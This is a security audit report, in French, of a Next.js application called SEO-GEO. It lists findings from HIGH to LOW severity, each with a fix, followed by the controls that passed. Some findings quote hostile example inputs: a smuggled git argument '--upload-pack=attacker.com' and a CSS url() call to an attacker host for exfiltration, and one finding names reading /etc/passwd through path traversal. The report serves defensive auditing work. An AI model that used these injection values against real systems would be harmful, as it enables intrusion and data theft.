# Audit Sécurité SEO-GEO — 2026-04-18

## Résumé Exécutif

| Sévérité | Nombre |
|----------|--------|
| CRITICAL | 0 |
| HIGH | 1 |
| MEDIUM | 4 |
| LOW | 2 |
| INFO | 3 |
| ✅ Contrôles OK | 15 |

**Score global : 74/100** — Pas de CRITICAL. 1 HIGH (path traversal) à corriger immédiatement.

---

## HIGH (CVSS 7.0-8.9)

### H1. uploadPath non validé — Path Traversal vers lecture arbitraire de fichiers

- **Localisation** : `app/api/audits/route.ts:~70` + `lib/audit/process.ts:81`
- **CWE** : CWE-22 (Path Traversal) | **OWASP** : A01:2021 | **CVSS** : 7.6
- **Description** : Un utilisateur authentifié peut soumettre un `uploadPath` arbitraire dans le body du POST `/api/audits`. Ce champ est stocké en base puis relu sans restriction lors de l'exécution de l'audit via `readCodeSnapshot(audit.uploadPath)`.
- **Impact** : Lecture de fichiers système arbitraires (`/etc/passwd`, clés privées, configs).
- **Preuve** :
  ```ts
  // lib/audit/process.ts:81
  ctx.code = await readCodeSnapshot(audit.uploadPath)
  // uploadPath provient directement du POST body, validé uniquement par z.string().max(400)
  ```
- **Remédiation** : Ne pas accepter `uploadPath` du client. Stocker l'ID de l'archive uploadée et reconstruire le chemin côté serveur. Sinon, validation stricte :
  ```ts
  const UPLOAD_TMP_PREFIX = '/tmp/seo-geo-uploads/'
  const resolved = path.resolve(audit.uploadPath)
  if (!resolved.startsWith(path.resolve(UPLOAD_TMP_PREFIX))) {
    return NextResponse.json({ error: 'invalid_upload_path' }, { status: 400 })
  }
  ```

---

## MEDIUM (CVSS 4.0-6.9)

### M1. Argument injection sur le nom de branche git

- **Localisation** : `lib/audit/code/clone.ts`
- **CWE** : CWE-88 (Argument Injection) | **CVSS** : 5.3
- **Description** : Le schéma Zod pour `branch` autorise `[\w./-]+` ce qui permet des valeurs commençant par `-` (ex: `--upload-pack=attacker.com`). La branche est passée directement à `simple-git` comme `args.push('--branch', branch)`.
- **Impact** : Redirection des opérations git vers un serveur externe via `--upload-pack`.
- **Remédiation** :
  ```ts
  const branchSchema = z.string().regex(/^[^\-][\w./-]*$/, 'invalid branch name')
  ```

### M2. CSP avec `'unsafe-inline'` sur script-src

- **Localisation** : `proxy.ts:32`
- **CWE** : CWE-79 (XSS facilitation) | **CVSS** : 5.1
- **Description** : `script-src 'self' 'unsafe-inline' https:;` — `'unsafe-inline'` annule l'effet protecteur du CSP. `https:` autorise tout script depuis n'importe quel domaine HTTPS.
- **Impact** : En cas de XSS découvert, le CSP n'offre aucun filet de sécurité.
- **Remédiation** : Phase immédiate : retirer `https:`. Phase V2 : migrer vers `'strict-dynamic'` + nonce (le nonce est déjà généré via `crypto.randomUUID()` et transmis en `x-nonce`).

### M3. TOCTOU sur le quota mensuel d'audits

- **Localisation** : `app/api/audits/route.ts:~113-130`
- **CWE** : CWE-362 (Race Condition) | **CVSS** : 4.3
- **Description** : Le check quota (SELECT COUNT) et l'INSERT sont deux requêtes séparées sans verrou. Deux requêtes simultanées peuvent toutes deux passer le check avant qu'une insertion soit visible.
- **Impact** : Dépassement du quota mensuel en envoyant des requêtes en parallèle.
- **Remédiation** :
  ```ts
  await db.transaction(async (tx) => {
    const [row] = await tx.execute(sql`
      SELECT COUNT(*) FROM audits
      WHERE organization_id = ${orgId}
      AND created_at >= date_trunc('month', now())
      FOR UPDATE
    `)
    if (row.count >= limit) throw new QuotaError()
    await tx.insert(audits).values({...})
  })
  ```

### M4. getClientIp dupliqué dans flash/route.ts — IP spoofing potentiel hors Vercel

- **Localisation** : `app/api/audit/flash/route.ts:14-20`
- **CWE** : CWE-807 (Reliance on Untrusted Inputs) | **CVSS** : 4.3
- **Description** : La route définit sa propre implémentation `getClientIp` lisant `x-forwarded-for` directement sans `TRUSTED_PROXY_MODE`. Sur Vercel c'est inoffensif, mais sur un déploiement self-hosted un attaquant peut spoofer son IP pour bypasser le rate limit.
- **Remédiation** :
  ```ts
  import { getClientIp } from '@/lib/security/ip'
  ```

---

## LOW (CVSS 0.1-3.9)

### L1. Webhook Stack Auth — fuite de longueur sur vérification HMAC

- **Localisation** : `app/api/webhooks/stack-auth/route.ts`
- **CWE** : CWE-208 (Timing Discrepancy) | **CVSS** : 2.6
- **Description** : `crypto.timingSafeEqual()` lève une exception si les longueurs diffèrent. Le `catch` retourne `false` immédiatement, révélant la longueur attendue via timing. La fonction canonique `constantTimeEqual` dans `lib/security/constant-time.ts` normalise les longueurs mais n'est pas utilisée ici.
- **Remédiation** :
  ```ts
  import { constantTimeEqual } from '@/lib/security/constant-time'
  ```

### L2. DOMPurify — exfiltration CSS via `<style>` tag

- **Localisation** : `lib/report/sanitize.ts`
- **CWE** : CWE-116 | **CVSS** : 2.0
- **Description** : La config DOMPurify inclut `ADD_TAGS: ['link', 'style']`. Un bloc `<style>` peut charger des ressources externes via `background-image: url(https://attacker.com/...)`. Surface limitée aux admins/consultants pouvant injecter du contenu dans les templates.
- **Remédiation** : Ajouter `FORBID_ATTR: ['src']` et bloquer `url()` dans les `<style>` via post-processing regex.

---

## INFORMATIONNEL

### I1. Sentry DSN exposé dans le code source

- **Fichiers** : `sentry.server.config.ts`, `sentry.edge.config.ts`, `instrumentation-client.ts`
- Intentionnel et documenté par Sentry — le DSN client-side est conçu pour être public. Risque résiduel : pollution du dashboard. Activer la validation de domaine dans les paramètres Sentry.

### I2. CSP_RELAXED bypass documenté

- **Fichier** : `proxy.ts:62`
- `process.env.CSP_RELAXED === '1'` ajoute `'unsafe-eval'`. S'assurer que cette variable est absente ou à `0` en production (vérifier dashboard Vercel).

### I3. Quota désactivé pour les audits planifiés

- **Fichier** : `app/api/cron/run-scheduled/route.ts:72-74`
- Le quota mensuel est intentionnellement bypassé pour les audits récurrents. Surveiller les organisations avec un nombre anormalement élevé d'audits schedulés.

---

## Contrôles Confirmés OK (15/15)

1. **Auth boundaries** — 24 routes auditées. Authentification présente sur toutes les routes protégées via `authenticateRequest`, `authenticateAuto`, `authenticateWithOrg`.
2. **SSRF guard** — Double couche : `assertSafeUrl` (sync) + `assertSafeDnsUrl` (async DNS) avec protection DNS rebinding. Chaque redirect re-validé.
3. **Multi-tenant isolation** — Toutes les queries DB filtrent par `organizationId`. Aucune fuite cross-tenant.
4. **Secrets hardcodés** — Aucun secret live. `.env.local` git-ignored. `.env.template` committé avec valeurs vides.
5. **Security headers** — X-Frame-Options DENY, X-Content-Type-Options nosniff, HSTS 2 ans + preload, Permissions-Policy (16 features), COOP, CORP.
6. **CSRF** — SameSite=Lax + Secure sur cookies. API JSON-only + Bearer token = non vulnérable.
7. **HMAC webhooks Stripe** — `stripe.webhooks.constructEvent()` + cross-check `organizationId`. Correct.
8. **Rate limiting** — Fail-closed en production. Routes `/api/audits` et `/api/audit/flash` couvertes.
9. **ZIP upload guards** — Bomb detection (ratio >100), max 500MB extraits, path traversal bloqué, whitelist extensions.
10. **Comparaison constante CRON** — `verifyBearerSecret` utilise `constantTimeEqual` normalisé.
11. **JWT algorithm confusion** — jose + `createRemoteJWKSet` impose RS256 JWKS. Pas de bypass "alg:none".
12. **XSS email templates** — `esc()` appliqué à toutes les données utilisateur.
13. **XSS rapport généré** — `escapeHtml()` à toutes les frontières + DOMPurify en défense en profondeur.
14. **npm audit** — 0 vulnérabilité high/critical. 4 moderate (deps dev), 4 low. Aucune vuln en production.
15. **Open redirect** — `url.pathname = redirectParam` reste same-origin via l'API URL Node.js.

---

## Plan d'Action Priorisé

| Priorité | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 — Immédiat | H1 — uploadPath path traversal | 1h | HIGH |
| 2 — Cette semaine | M1 — Branch arg injection | 30min | MEDIUM |
| 3 — Cette semaine | M4 — getClientIp dupliqué flash | 15min | MEDIUM |
| 4 — Sprint suivant | M2 — CSP unsafe-inline | Migration nonce | MEDIUM |
| 5 — Sprint suivant | M3 — TOCTOU quota | Transaction DB | MEDIUM |
| 6 — Backlog | L1 — Stack Auth HMAC longueur | 15min | LOW |
| 7 — Backlog | L2 — DOMPurify CSS exfil | 1h | LOW |
